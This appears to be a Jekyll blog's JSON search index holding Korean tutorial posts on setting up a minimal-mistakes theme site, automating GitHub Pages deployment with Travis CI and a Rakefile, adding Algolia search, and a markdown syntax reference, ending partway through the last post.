var store = [{
        "title": "_config.yml 설정하기",
        "excerpt":"minimal-mistakes 테마의 기본 _config.yml을 수정한 내용입니다 개인적인 의견으로 작성 시 기본 설정 파일을 가지고 내용을 추가해 나가는 것이 편합니다! _config.yml # Welcome to Jekyll!## This config file is meant for settings that affect your entire site, values# which you are expected to set up once and rarely need to edit after that.# For technical reasons, this file is *NOT* reloaded automatically when you use# `jekyll serve`. If you change this file, please restart the server process.# Theme Settings## Review documentation to determine if you should use `theme` or `remote_theme`# https://mmistakes.github.io/minimal-mistakes/docs/quick-start-guide/#installing-the-theme# 테마 설정에 대한 부분입니다. 기본 설정을 유지하였습니다.theme                  : \"minimal-mistakes-jekyll\"#remote_theme           : \"mmistakes/minimal-mistakes\"# 스킨을 설정하는 부분입니다. minimal_mistakes_skin    : \"dark\" # \"air\", \"aqua\", \"contrast\", \"dark\", \"dirt\", \"neon\", \"mint\", \"plum\", \"sunrise\"# Site Settingslocale                   : \"ko-KR\" # 사이트의 언어 설정을 할 수있습니다.# 표시되는 언어의 내용은 _data/ui-text.yml 에서 수정이 가능합니다.title                    : \"Imreplay blog\" # 블로그 제목title_separator          : \"-\" # 글 제목 - 블로그 제목  과 같이 사이트를 표시해줍니다.name                     : \"Imreplay\" # 사이트 소유자의 이름을 사용합니다.(Used to assign a site author.)description              : \"Imreplay's personal website.\" # 사이트에 대한 간단한 설명입니다.url                      : \"https://blog.imreplay.xyz\" # the base hostname &amp; protocol for your site e.g. \"https://mmistakes.github.io\"# 사이트의 주소를 입력합니다.baseurl                  : # the subpath of your site, e.g. \"/blog\"# 사이트의 baseurl을 설정해 줍니다.repository               : \"imreplay/blog\" # GitHub username/repo-name e.g. \"mmistakes/minimal-mistakes\"teaser                   : # path of fallback teaser image, e.g. \"/assets/images/500x300.png\"# breadcrumbs            : false # true, false (default)words_per_minute         : 200 #read time을 계산하기 위한 분당 읽는 글자수 입니다. comments: # 댓글 설정에 대한부분입니다. 기본적으로 false 로 되어있습니다.  provider               : \"disqus\" # false (default), \"disqus\", \"discourse\", \"facebook\", \"google-plus\", \"staticman\", \"staticman_v2\" \"custom\"  disqus:   #개인적으로 disqus 댓글 모듈을 사용하였습니다.    shortname            : imreplay-blog # https://help.disqus.com/customer/portal/articles/466208-what-s-a-shortname-  discourse:    server               : # https://meta.discourse.org/t/embedding-discourse-comments-via-javascript/31963 , e.g.: meta.discourse.org  facebook:    # https://developers.facebook.com/docs/plugins/comments    appid                :    num_posts            : # 5 (default)    colorscheme          : # \"light\" (default), \"dark\"staticman:  allowedFields          : # ['name', 'email', 'url', 'message']  branch                 : # \"master\"  commitMessage          : # \"New comment.\"  filename               : # comment-{@timestamp}  format                 : # \"yml\"  moderation             : # true  path                   : # \"/_data/comments/{options.slug}\" (default)  requiredFields         : # ['name', 'email', 'message']  transforms:    email                : # \"md5\"  generatedFields:    date:      type               : # \"date\"      options:        format           : # \"iso8601\" (default), \"timestamp-seconds\", \"timestamp-milliseconds\"reCaptcha:  siteKey                :  secret                 :atom_feed:  path                   : # blank (default) uses feed.xml#사이트내 검색 설정에 대한 부분입니다.search                   : true # true, false (default)search_full_content      : true # true, false (default)# 저의 경우 algolia 를 사용하고 있으며 추가설정이 필요합니다.search_provider          : algolia # lunr (default), algolia, googlealgolia:  application_id         : 237ZENFYNY # YOUR_APPLICATION_ID  index_name             : blog # YOUR_INDEX_NAME  search_only_api_key    : 5cfd50ded1da95d695708070be40e3b9 # YOUR_SEARCH_ONLY_API_KEY  powered_by             : # true (default), falsegoogle:  search_engine_id       : # YOUR_SEARCH_ENGINE_ID  instant_search         : # false (default), true# SEO Related 웹마스터 도구 사용을 도와주는 부분입니다.google_site_verification :bing_site_verification   :yandex_site_verification :naver_site_verification  :# Social Sharingtwitter:  username               :facebook:  username               :   app_id                 :  publisher              :og_image                 : # Open Graph/Twitter default site image# For specifying social profiles# - https://developers.google.com/structured-data/customize/social-profilessocial:  type                   : # Person or Organization (defaults to Person)  name                   : # If the user or organization name differs from the site's name  links: # An array of links to social media profiles#구글 애널리틱스에 대한 설정입니다.# Analyticsanalytics:  provider               : \"google-gtag\" # false (default), \"google\", \"google-universal\", \"custom\"  google:    tracking_id          : \"UA-120523980-2\"    anonymize_ip         : # true, false (default)# 사이트 소유자에 대한 정보를 작성합니다.# Site Authorauthor:  name             : \"Imreplay\"  avatar           : # path of avatar image, e.g. \"/assets/images/bio-photo.jpg\"  bio              : \"천천히 굴러가는 개인 공부 블로그\"  location         : \"Republic of Korea\"  email            : \"imreplay@imreplay.xyz\"  uri              : \"https://blog.imreplay.xyz\"  home             : # null (default), \"absolute or relative url to link to author home\"  bitbucket        :  codepen          :  dribbble         :  flickr           :  facebook         : \"imreplay08\"  foursquare       :  github           : \"imreplay\"  gitlab           :  google_plus      :  keybase          :  instagram        :  lastfm           :  linkedin         : # \"john-doe-12345678\" (the last part of your profile url, e.g. https://www.linkedin.com/in/john-doe-12345678)  pinterest        :  soundcloud       :  stackoverflow    : # \"123456/username\" (the last part of your profile url, e.g. https://stackoverflow.com/users/123456/username)  steam            : # \"steamId\" (the last part of your profile url, e.g. https://steamcommunity.com/id/steamId/)  tumblr           :  twitter          :  vine             :  weibo            :  xing             :  youtube          : # \"https://youtube.com/c/MichaelRoseDesign\"# Reading Filesinclude:  - .htaccess  - _pagesexclude:  - \"*.sublime-project\"  - \"*.sublime-workspace\"  - vendor  - .asset-cache  - .bundle  - .jekyll-assets-cache  - .sass-cache  - assets/js/plugins  - assets/js/_main.js  - assets/js/vendor  - Capfile  - CHANGELOG  - config  - Gemfile  - Gruntfile.js  - gulpfile.js  - LICENSE  - log  - node_modules  - package.json  - Rakefile  - README  - tmpkeep_files:  - .git  - .svnencoding: \"utf-8\"markdown_ext: \"markdown,mkdown,mkdn,mkd,md\"# Conversionmarkdown: kramdownhighlighter: rougelsi: falseexcerpt_separator: \"\\n\\n\"incremental: false# Markdown Processingkramdown:  input: GFM  hard_wrap: false  auto_ids: true  footnote_nr: 1  entity_output: as_char  toc_levels: 1..6  smart_quotes: lsquo,rsquo,ldquo,rdquo  enable_coderay: false# Sass/SCSSsass:  sass_dir: _sass  style: compressed # http://sass-lang.com/documentation/file.SASS_REFERENCE.html#output_style# Outputtingpermalink: /:categories/:title/paginate: 5 # amount of posts to showpaginate_path: /page:num/timezone: \"Asia/Seoul\" # https://en.wikipedia.org/wiki/List_of_tz_database_time_zones# 플러그인을 정의하는 부분입니다.# Plugins (previously gems:)plugins:  - jekyll-algolia  - jekyll-paginate  - jekyll-sitemap  - jekyll-gist  - jekyll-feed  - jemoji# mimic GitHub Pages with --safewhitelist:  - jekyll-paginate  - jekyll-sitemap  - jekyll-gist  - jekyll-feed  - jemoji# Archives#  Type#  - GitHub Pages compatible archive pages built with Liquid ~&gt; type: liquid (default)#  - Jekyll Archives plugin archive pages ~&gt; type: jekyll-archives#  Path (examples)#  - Archive page should exist at path when using Liquid method or you can#    expect broken links (especially with breadcrumbs enabled)#  - &lt;base_path&gt;/tags/my-awesome-tag/index.html ~&gt; path: /tags/#  - &lt;base_path/categories/my-awesome-category/index.html ~&gt; path: /categories/#  - &lt;base_path/my-awesome-category/index.html ~&gt; path: /category_archive:  type: liquid  path: /categories/tag_archive:  type: liquid  path: /tags/# https://github.com/jekyll/jekyll-archives# jekyll-archives:#   enabled:#     - categories#     - tags#   layouts:#     category: archive-taxonomy#     tag: archive-taxonomy#   permalinks:#     category: /categories/:name/#     tag: /tags/:name/# HTML Compression# - http://jch.penibelst.de/compress_html:  clippings: all  ignore:    envs: development# Front Matter 설정입니다.# 페이지 본문에 적용되는 기본 설정들을 정의합니다.# path 값으로 경로를 설정해 줍니다.# Defaultsdefaults:  # _posts  - scope:      path: \"\"      type: posts    values:      layout: single      author_profile: true      read_time: true      comments: true      share: true      related: true  # 테마에 포함되어 있던 Docs 폴더의 _config.yml을 참고하여 _pages 폴더를 만들고 그 폴더에 대한 출력 방법을 정의 했습니다.  # _pages  - scope:      path: \"_pages\"      type: pages    values:      layout: single      author_profile: true# Travis-ci 를 사용하기 위해 추가한 부분입니다.# Jasper2 테마의 Travis-ci 설정부분을 사용합니다. ##build option# Settings for builing master branch with travis-ci# with jekyll-travis# Settings for deploy rake task# Username and repo of Github repo, e.g.# https://github.com/USERNAME/REPO.git# username defaults to ENV['GIT_NAME'] used by Travis# repo defaults to USERNAME.github.io# Branch defaults to \"source\" for USERNAME.github.io# or \"master\" otherwisesafe: Falselsi: Falseusername: imreplay # Github Usernamerepo: blog # Github repo namebranch: master # 작업 브랜치를 설정relative_source: ../blog/ # 저는 repo 이름으로 설정했습니다.destination: ../posts # 빌드시 작업파일이 저장될 경로production_url:  https://blog.imreplay.xyz # 사이트 URLsource_url:  https://github.com/imreplay/blog/ # Github 저장소 URL","categories": ["blogging"],
        "tags": ["jekyll"],
        "url": "https://imreplay.com/blogging/config-yml/",
        "teaser":null},{
        "title": "minimal mistakes 테마를 이용해 github.io 블로그 구축하기",
        "excerpt":"Intro 처음 만들어보는 페이지이다 보니 부족한 부분이 많습니다.언제든지 댓글 남겨주시면 수정하도록 하겠습니다! 본 포스팅은 블로그 구축 후 작성하는 것으로,  minimal mistakes 테마를 Fork 하여 본인의 입맛에 맞게 수정하는 과정입니다. 또한 일부 내용은 https://mmistakes.github.io/minimal-mistakes/docs/quick-start-guide/ 의 내용을 참고하였습니다. 테마 Fork 후 불필요한 내용 삭제 저의 경우 minimal mistakes 테마 를 사용했습니다.  위 저장소에 접속 하여 우측 상단의 Fork 버튼을 눌러 자신의 저장소로 복제 해 줍시다. 그 후 테마에 포함되어있는 불필요한 파일들을 삭제 해 줍니다. 목록은 아래와 같습니다.   .editorconfig  .gitattributes  .github  /docs  /test  CHANGELOG.md  minimal-mistakes-jekyll.gemspec  README.md  screenshot-layouts.png  screenshot.png샘플페이지에 대한 데이터는 docs/ 디렉터리에 저장되어 있으니 참고하실 분들은 삭제 하지 않으셔도 되지만 사이트에 샘플 포스트가 표시될 수 있습니다. _config.yml 변경 저장소 최상위 디렉토리에 존재하는 _config.yml 파일을 사용자의 취향에 맞게 설정 해 줍니다. 현재 사이트의 설정은 _config.yml 설정하기 에서 확인할 수 있습니다. _config.yml 에 대한 자세한 설명은 configuration 에서 확인할 수 있습니다. github pages 를 이용하시는 분들은https://github.com/imreplay/minimal-mistakes#github-pages-method 를 참고하여 gem \"github-pages\", group: :jekyll_plugins 추가 및 remote_theme: \"mmistakes/minimal-mistakes\"  설정, theme 부분 주석 처리 해주셔야 합니다! Settings 에서 github pages 브랜치 설정을 master 로 설정해주시면 계정명.github.io/저장소명 으로 접근 가능합니다! 예를 들면 https://imreplay.github.io/test/ 처럼요! Gemfile 설정 최상위 디렉토리에 위치한 Gemfile을 수정해 줍니다. Gemfile에 대해서는 모르는 부분이 많아 샘플 Gemfile을 참고하시는것을 추천드립니다. Gemfile?   다양한 Gem을 등록하는 파일 입니다.  Gem은 루비에서 지원하는 패키지 시스템으로 필요한 프로그램을 관리할 수 있도록 도와줍니다.아래는 예제 파일입니다. minimal mistake 에서 샘플로 제공하는 Gemfile (추천) source \"https://rubygems.org\"gem \"github-pages\", group: :jekyll_pluginsgem \"tzinfo-data\"gem \"wdm\", \"~&gt; 0.1.0\" if Gem.win_platform?# If you have any plugins, put them here!group :jekyll_plugins do  gem \"jekyll-paginate\"  gem \"jekyll-sitemap\"  gem \"jekyll-gist\"  gem \"jekyll-feed\"  gem \"jemoji\"  gem \"jekyll-algolia\"end현재 사이트에 적용되어있는 Gemfile source \"https://rubygems.org\"gem \"minimal-mistakes-jekyll\"gem \"jekyll\", \"~&gt; 3.6.2\"gem \"github-pages\", \"~&gt; 168\"gem \"rake\", \"~&gt; 12.3.0\"group :jekyll_plugins do  gem \"jekyll-feed\"  gem \"jekyll-seo-tag\"  gem \"jekyll-sitemap\"  gem \"jekyll-paginate\"  gem \"jekyll-algolia\"endnavigation.yml 수정하기 최상위 디렉토리의 _data/navigation.yml 을 수정합니다. # main linksmain:  - title: \"About\" # 네비게이션 바에 표시 되는 이름    url: \"/about/\" # 클릭시 이동할 URL  - title: \"Category\"    url: /categories/  # - title: \"Sample Collections\"  #   url: /collection-archive/  # - title: \"Sitemap\"  #   url: /sitemap또한 이 파일을 통해 Sidebar를 커스터마이징 하는 기능또한 제공되고 있습니다. 해당 기능에 대한 설명은 custom-sidebar-navigation-menu 에서 확인가능합니다. _pages 추가하기 기본 설정들은 어느정도 끝났으니 몇가지 페이지를 만들어봅시다. 먼저 최상위 폴더에 _pages 라는 폴더를 만들어 준 후 minimal-mistake에서 샘플로 제공되는 페이지 중 필요한 걸 몇가지 가져옵니다. 이번 포스팅에서 추가할 페이지는   404 에러 페이지 (404.md)  about 페이지 (about.md)  카테고리 페이지 (category-archive.md)  태그 페이지 (tag-archive.md)정도만 가져오도록 하겠습니다. /_pages ㄴ404.md ㄴabout.md ㄴcategory-archive.md ㄴtag-archive.md이런 구조가 되겠군요. 추가적으로 필요한 페이지가 있다면 가져오시면 되겠습니다. about.md 페이지를 제외한 나머지 페이지들은 크게 수정할 부분이 없으니 그대로 사용하고, about 페이지는 개인의 취향에 맞게 수정하여 사용하시면 됩니다. 그 후  _config.yml 파일에 _pages에 대한 내용을 추가해줍니다. _config.yml defaults:  # _posts  - scope:      path: \"\"      type: posts    values:      layout: single      author_profile: true      read_time: true      comments: true      share: true      related: true  #&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 여기서부터 추가 됨  # _pages 부분입니다.  - scope:      path: \"_pages\"      type: pages    values:      layout: single      author_profile: true  # &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 여기까지 추가 됨포스팅 하기 _posts 디렉토리를 최상위 폴더에 생성한 후 YYYY-MM-DD-제목.md 형식으로 포스팅을 생성합니다. 2018-01-01-hello-world.md 와 같이 작성하시면 됩니다. 그 후, 헤더를 작성하고 글을 포스팅하면 됩니다. ---title: \"minimal mistakes 테마를 이용해 github.io 블로그 구축하기\"categories:   - blogginglast_modified_at: 2018-07-01T13:00:00+09:00toc: true---위와같이 작성 할 수 있으며, 들어가는 항목은 title, categories, tags 등이 있습니다다. https://mmistakes.github.io/minimal-mistakes/ 에서 여러가지 샘플들을 보며 참고하면 편할 듯 합니다. 아래는 몇가지 헤더부분에 들어가는 몇가지 예제입니다. tags: # 태그 사용    - tag1    - tag2categories: #카테고리  - category aauthor_profile: true / false #작성자 프로필 출력여부read_time: false # read_time을 출력할지 여부 1min read 같은것!toc: true #Table Of Contents 목차 보여줌toc_label: \"My Table of Contents\" # toc 이름 정의toc_icon: \"cog\" #font Awesome아이콘으로 toc 아이콘 설정toc_sticky: true # 스크롤 내릴때 같이 내려가는 목차gallery: #이미지 갤러리  - url: /assets/images/unsplash-gallery-image-1.jpg    image_path: /assets/images/unsplash-gallery-image-1-th.jpg    alt: \"placeholder image 1\"    title: \"Image 1 title caption\"  - url: /assets/images/unsplash-gallery-image-2.jpg    image_path: /assets/images/unsplash-gallery-image-2-th.jpg    alt: \"placeholder image 2\"    title: \"Image 2 title caption\"#다음과 같이 본문에서 사용한다.{% include gallery caption=\"This is a sample gallery with **Markdown support**.\" %}header:  # 헤더에 유튜브 비디오 삽입  video:    id: XsxDH4HcOWA    provider: youtubelink: https://github.com # Direct Link 만들기결과 페이지는 https://imreplay.github.io/test/ 처럼 나오네요! 다음 포스팅은 travis-ci를 통해 push를 하면 자동으로 Build되어 gh-pages 브랜치로 결과 파일을 push 해주는 방법에 대하여 포스팅 하도록 하겠습니다. 혹시 안되거나 에러나는 부분들, 설명이 부족한 부분은 댓글로 남겨주세요! ","categories": ["blogging"],
        "tags": ["jekyll"],
        "url": "https://imreplay.com/blogging/minimal-mistakes-%ED%85%8C%EB%A7%88%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%B4-githubio-%EB%B8%94%EB%A1%9C%EA%B7%B8-%EA%B5%AC%EC%B6%95%ED%95%98%EA%B8%B0/",
        "teaser":null},{
        "title": "Travis-ci를 이용해 배포 자동화 시키기",
        "excerpt":"저번 포스팅에서는 minimal-mistake 테마를 이용해서 기본적인 설정을 했습니다. 이번 포스팅에서는 minimal-mistake 테마에서 Travis-ci라는 서비스를 이용하여 Github에 push하면 자동으로 build 및 gh-pages 브랜치에 push 하는 방법에 대하여 포스팅 하고자 합니다. travis-ci 부분의 내용은 대부분 jasper2에서 사용한 코드를 참고 하였습니다. _config.yml 수정하기 먼저 상단에 위치한 theme / remote_theme 부분을 확인합니다. Github pages 를 사용하는지, travis-ci를 사용하는지에 따라 설정이 달라지기 때문인데요, 먼저, travis-ci를 쓸경우  theme                  : \"minimal-mistakes-jekyll\"#remote_theme           : \"mmistakes/minimal-mistakes\"위와 같이 remote_theme는 주석처리 하도록 합니다. 반대로 github pages 를 사용할 경우, theme를 주석 처리 해주시면 됩니다. 그 다음 아래의 코드를 추가 후 자신의 환경에 맞게 수정해 줍니다. # Settings for builing master branch with travis-ci# with jekyll-travis# Settings for deploy rake task# Username and repo of Github repo, e.g.# https://github.com/USERNAME/REPO.git# username defaults to ENV['GIT_NAME'] used by Travis# repo defaults to USERNAME.github.io# Branch defaults to \"source\" for USERNAME.github.io# or \"master\" otherwisesafe: Falselsi: Falseusername: Superman #Github usernamerepo: my-blog #Github repobranch: masterrelative_source: ../my-blog/destination: ../postsproduction_url:  https://blog.imreplay.xyz # https://[username].github.io/[repo] or Your Custom URLsource_url:  https://github.com/imreplay/blog/ # Github repo URL.travis.yml 수정하기 다음으로 .travis.yml을 수정해줍니다. language: rubycache: bundlerinstall:  # Install Jekyll and dependencies  - bundle installscript:  - bundle exec rake site:deploy --quietbranches:  only:    # Change this to gh-pages if you're deploying using the gh-pages branch    - masterrvm: - 2.4.2# Generate your secure token with the travis gem:# get Github token from your Travis CI profile page# gem install travis# GH_TOKEN from https://github.com/settings/tokens# travis encrypt 'GIT_NAME=\"YOUR_USERNAME\" GIT_EMAIL=\"YOUR_EMAIL\" GH_TOKEN=YOUR_TOKEN'env:  global:    secure: \"your Secure Key\"Gemfile에 rake 추가 하기 Gemfile을 열어 gem \"rake\"를 추가해 줍니다. 없으면 빨리 추가하라고 에러를.. gh-pages 브랜치 만들기 제일 간편한 방법으로 가봅시다.        Github 저장소로 갑니다!         왼쪽 상단에 Branch: master 부분을 클릭합니다         Find or create a branch... 라는 부분이 보인다면 gh-pages 를 입력하고 엔터!         짠! gh-pages 브랜치가 생성되었습니다!   이제 travis-ci 가 빌드한 결과 파일은 gh-pages 브랜치로 Push 될겁니다! travis-ci 연결하고 토큰 발급 받기 travis-ci.org 에 접속하여 github 계정으로 로그인 합니다.  우측 상단의 프로필 메뉴를 클릭해 들어가서,  목록에 보이는 repo 목록중 해당하는 repo를 찾아 활성화 시켜줍니다.  travis-ci 서비스에서 github에 push 할 수 있게 Token을 발급해줍니다. 토큰은 Setting - Developer settings - Personal access tokens 에서 발급받을 수 있습니다.                                                                                                                                                           Generate new Token을 눌러 새로운 토큰을 만들어 줍니다. description을 쓴 후 Select scopes 에서 repo 를 선택한 후 Generate Token 을 누르면 토큰을 발급받을 수 있습니다. 해당 토큰을 바로 사용할 경우 보안상의 위험이 있어, 암호화 하여 사용합니다. secure 값 발급 받기 이번 부분은 Command 환경에서 작업합니다. 저는 우분투 환경에서 작업하였습니다. ruby가 설치되지 않은경우 ruby를 먼저 설치해 줍니다. 그 후 프로젝트 디렉토리로 이동후 진행 합니다. 아직 clone 하지 않았을 경우 clone 하여 해당 디렉토리로 이동합니다.   git clone https://github.com/[username]/[repo] 먼저 travis gem을 설치해 줍니다.   gem install travis 설치를 마친 후 아래 명령어를 자신에게 맞게 수정하여 입력합니다. travis encrypt 'GIT_NAME=\"YOUR_USERNAME\" GIT_EMAIL=\"YOUR_EMAIL\" GH_TOKEN=YOUR_TOKEN' GIT_NAME에는 Github 사용자 이름, GIT_EMAIL에는 Github에서 사용하는 email 주소, GH_TOKEN에는 위에서 발급받았던 토큰 값을 입력해줍니다. 따옴표 부분은 잘못 된 것이 아니며, 그대로 사용하시면 됩니다!! 결과 값으로 나오는 값을 .travis.yml 파일의 secure 부분에 붙여넣어줍니다. JEKYLL_ENV 환경변수 추가해주기 몇몇 기능들은 JEKYLL_ENV 환경변수가 production 일때만 작동하는 부분이 있습니다, 댓글기능, 구글 애널리틱스 등이 포함되어 있습니다. Default 값은 development 로 정의 되어있는데 이걸 production 으로 바꾸어 줍시다. travis-ci 페이지에서 프로필로 들어가 원하는 repo의 Settings로 들어갑니다.  Environment Variables 부분을 찾아 그림과 같이 Name 부분에 JEKYLL_ENV, Value 부분에 production을 입력하고 build log에 표시 될지 여부를 선택 한 후 Add를 눌러 환경변수를 추가 해 줍니다. Rakefile 작성 최상위 경로에 Rakefile 파일을 수정합니다. 해당 파일은 jasper2의 Rakefile을 사용하였습니다. ############################################################################### Modified version of jekyllrb Rakefile# https://github.com/jekyll/jekyll/blob/master/Rakefile##############################################################################require 'rake'require 'date'require 'yaml'CONFIG = YAML.load(File.read('_config.yml'))USERNAME = CONFIG[\"username\"]REPO = CONFIG[\"repo\"]SOURCE_BRANCH = CONFIG[\"branch\"]DESTINATION_BRANCH = \"gh-pages\"def check_destination  unless Dir.exist? CONFIG[\"destination\"]    sh \"git clone https://$GIT_NAME:$GH_TOKEN@github.com/#{USERNAME}/#{REPO}.git #{CONFIG[\"destination\"]}\"  endendnamespace :site do  desc \"Generate the site\"  task :build do    check_destination    sh \"bundle exec jekyll build\"  end  desc \"Generate the site and serve locally\"  task :serve do    check_destination    sh \"bundle exec jekyll serve\"  end  desc \"Generate the site, serve locally and watch for changes\"  task :watch do    sh \"bundle exec jekyll serve --watch\"  end  desc \"Generate the site and push changes to remote origin\"  task :deploy do    # Detect pull request    if ENV['TRAVIS_PULL_REQUEST'].to_s.to_i &gt; 0      puts 'Pull request detected. Not proceeding with deploy.'      exit    end    # Configure git if this is run in Travis CI    if ENV[\"TRAVIS\"]      sh \"git config --global user.name $GIT_NAME\"      sh \"git config --global user.email $GIT_EMAIL\"      sh \"git config --global push.default simple\"    end    # Make sure destination folder exists as git repo    check_destination    sh \"git checkout #{SOURCE_BRANCH}\"    Dir.chdir(CONFIG[\"destination\"]) { sh \"git checkout #{DESTINATION_BRANCH}\" }    # Generate the site    sh \"bundle exec jekyll build\"        # Commit and push to github    sha = `git log`.match(/[a-z0-9]{40}/)[0]    Dir.chdir(CONFIG[\"destination\"]) do      # check if there is anything to add and commit, and pushes it      sh \"if [ -n '$(git status)' ]; then            git add --all .;            git commit -m 'Updating to #{USERNAME}/#{REPO}@#{sha}.';            git push --quiet origin #{DESTINATION_BRANCH};         fi\"      puts \"Pushed updated branch #{DESTINATION_BRANCH} to GitHub Pages\"    end  endend저장 후 travis-ci가 잘 작동하는지 확인해 봅니다. Commit - Push! 진행상황은 travis-ci 페이지에서 확인 할 수 있습니다. 두근두근.. 에러-수정-빌드-에러-수정-빌드-에러…-빌드 완성!!  약 2~3분정도의 시간이 소요됩니다! 2분 45초정도 소요 되었네요..! 마치며 새로운 저장소를 만들고 한번더 theme와 travis-ci를 연동시켜보니 어느정도 익숙해진 것 같습니다 이제 다음 포스팅에서는 검색 서비스인 algolia, 댓글 기능을 제공하는 disqus 를 적용시켜보고 blogging 포스팅을 마치겠습니다! ","categories": ["blogging"],
        "tags": ["travis-ci"],
        "url": "https://imreplay.com/blogging/Travis-ci%EB%A5%BC-%ED%86%B5%ED%95%B4-%EB%B0%B0%ED%8F%AC%EC%9E%90%EB%8F%99%ED%99%94/",
        "teaser":null},{
        "title": "Travis-ci를 이용해 Github.io 블로그에 검색도구인 Algolia를 적용시켜보자.",
        "excerpt":"Intro 이번 포스팅에서는 검색도구인 algolia를 jekyll에서 적용시키는 방법에 대해 포스팅하겠습니다. 먼저 어떻게 생긴 친구인지 한번 보고 시작하는 것도 나쁘지 않겠죠?  검색한 키워드를 하이라이팅 해주고 비슷한 단어에 대한 검색도 해줘서 오타가 있어도 어느정도 검색결과가 안정적으로 나오는 것을 보고 선택하게 되었습니다. algolia 설정하기 포스팅에서 사용되는 환경은 Travis-ci 를 사용한 환경입니다.Githib pages 를 사용한 환경은 https://community.algolia.com/jekyll-algolia/github-pages.html 를 참고 바랍니다. 먼저 algolia 사이트에 접속하여 회원가입을 해줍니다.  Github를 통한 로그인 기능을 지원하므로 간단하게 가입이 가능합니다. 간단한 개인정보를 입력하는 창이 나옵니다.  다음으로 데이터센터를 선택하는 부분입니다. 가깝고 빠른 데이터 센터로 하시면 됩니다.  뭔가를 물어보는 것 같지만 Skip 이라는 버튼이 있는걸 보니 꼭 필요한건 아닌가 봅니다 가볍게 skip 을 눌러줍니다.  이렇게 가입이 끝났습니다.  대시보드로 이동해봅시다. 튜토리얼을 할것인지 물어봅니다. 원하시는 분들은 들어보시면 됩니다! 튜토리얼부분은 넘어가도록하겠습니다. 요금 정책 선택 메인페이지에서 가장 눈에 띄는 부분은 상단의 ESSENTIAL plan - 14 free days remaining 라는 부분입니다. 검색 서비스 요금 정책에 관한 내용인거 같군요 14일 무료라고 하지만 뭔가 찝찝하신 분들은 우측 하단에 보이는 CHAHNGE PLAN 버튼을 눌러 COMMUNITY 를 선택하시면 됩니다. ESSENTIAL 부분에 FREE FOR OPEN SOURCE 라고 적혀있는 걸 보니 잘 살펴보시고 해당하시면 신청해보는 것도 좋은 것 같습니다! 설정하기 이제 기본적인 설정을 해보겠습니다. 좌측 메뉴중에 Indices 탭을 선택하여 줍니다. 예제로 만들어진 인덱스가 존재하는 것 같군요. MANAGE CURRENT INDEX 를 눌러 DELETE 해줍니다.  다음으로 New index를 눌러 새로운 인덱스를 추가해 줍니다. 적당한 Index name을 기입하여 준 후 CREATE를 눌러 새로운 인덱스를 생성합니다.  새로운 인덱스가 만들어 진것을 확인 후 좌측의 API Keys 를 선택해줍니다.  Application ID와 Search-Only API Key를 확인할 수 있습니다. 이제 블로그에 적용 시켜보도록 하겠습니다. _config.yml 파일의 search 부분을 찾아 수정해줍니다. search                   : true # true, false (default)search_full_content      : true # true, false (default)search_provider          : algolia # lunr (default), algolia, googlealgolia:  application_id         : 237ZENFYNY # YOUR_APPLICATION_ID  index_name             : blog # YOUR_INDEX_NAME  search_only_api_key    : 5cfd50ded1da95d695708070be40e3b9 # YOUR_SEARCH_ONLY_API_KEY  powered_by             : # true (default), falsesearch_provider 는 algolia 를 입력 해주고, application_id, search_only_api_key 는 API keys에서 보여지는 값들을 입력해줍니다. index_name 에는 방금전에 index를 생성할 때 입력했던 값을 넣어주면 됩니다. Gemfile 에 Gem 추가하기 \"jekyll-algolia\" Gem 을 Gemfile에 :jekyll_plugins 섹션에 추가해줍니다. group :jekyll_plugins do  gem \"jekyll-feed\"  gem \"jekyll-seo-tag\"  gem \"jekyll-sitemap\"  gem \"jekyll-paginate\"  gem \"jekyll-algolia\"endTravis-ci에 API key 추가 해주기 Travis-ci 에 접속하여 원하는 repo 의 Settings에 접속합니다. Name 값으로는 ALGOLIA_API_KEY를 , Value 값에는 algolia 사이트의 API keys 탭에 있는 Admin API Key 값을 복사하여 적어줍니다.  Build log에는 Display되면 안되므로 그대로 둔 후 Add 해줍니다.  이런식으로 환경변수에 추가된 것을 확인할 수 있습니다. Rakefile 수정하기 ##중략# Generate the site    sh \"bundle exec jekyll build\"# Run Algolia     sh \"bundle exec jekyll algolia\"##중략빌드 후 algolia에 해당 내용을 전달하여 검색을 빠르게 진행할 수 있도록 합니다. 저장 후 커밋 해주면 검색기능을 사용할 수 있습니다. Outtro 포스팅을 작성하면서 ESSENTIAL 플랜에 FREE FOR OPEN SOURCE 문구가 달려있는걸 발견했네요 얼른 읽어보러 가야겠습니다! ","categories": ["blogging"],
        "tags": ["disqus"],
        "url": "https://imreplay.com/blogging/%EA%B2%80%EC%83%89-%EB%8F%84%EA%B5%AC%EC%9D%B8-Algolia%EB%A5%BC-%EC%A0%81%EC%9A%A9%ED%95%B4%EB%B3%B4%EC%9E%90/",
        "teaser":null},{
        "title": "블로그에서 사용하는 문법 정리",
        "excerpt":"     On This Page   제목  인용  리스트  코드 강조  강조  링크  이미지  표  버튼  Notice  정의  수평선  (축)약어  주석  각주  이번 포스팅은 나중에 글 쓸때 참고할 용도로 작성하는 포스팅입니다. 다양한 마크다운 문법과 테마에서 지원하는 기능들을 간단하게 미리볼 수 있습니다. 본 포스팅은 지속 업데이트 될 수 있습니다. 제목 # H1 ## H2 ### H3 #### H4 ##### H5 ###### H6 인용   &gt;       &gt;&gt;           &gt;&gt;&gt;               &gt;&gt;&gt;&gt;             … 리스트   1번  2번  3번* 항목* 항목  * 요소  - 요소  + 요소    * 요소 안에 또 요소      * 안에 한개더  항목  항목          요소      요소      요소                  요소 안에 또 요소                          안에 한개더                                          코드 강조 ```pythonfor i in data:  print(i)  def add(a,b):  return a+b  print('hello world!')```for i in data:  print(i)  def add(a,b):  return a+b  print('hello world!')강조 **Bold** __Bold2__ ~~취소선~~ _기울임_ *기울임2* 링크 &lt;http://facebook.com/&gt;http://facebook.com/ [googlelink](https://google.com)googlelink 이미지 ![alt text](/assets/img/fromis.PNG) 표 | Header1 | Header2 | Header3 ||:--------|:-------:|--------:|| cell1   | cell2   | cell3   || cell4   | cell5   | cell6   |            Header1      Header2      Header3                  cell1      cell2      cell3              cell4      cell5      cell6      버튼 Default ButtonPrimary ButtonSuccess ButtonWarning ButtonDanger ButtonInfo ButtonInverse ButtonLight Outline Button [Default Button Text](#link){: .btn}[Primary Button Text](#link){: .btn .btn--primary}[Success Button Text](#link){: .btn .btn--success}[Warning Button 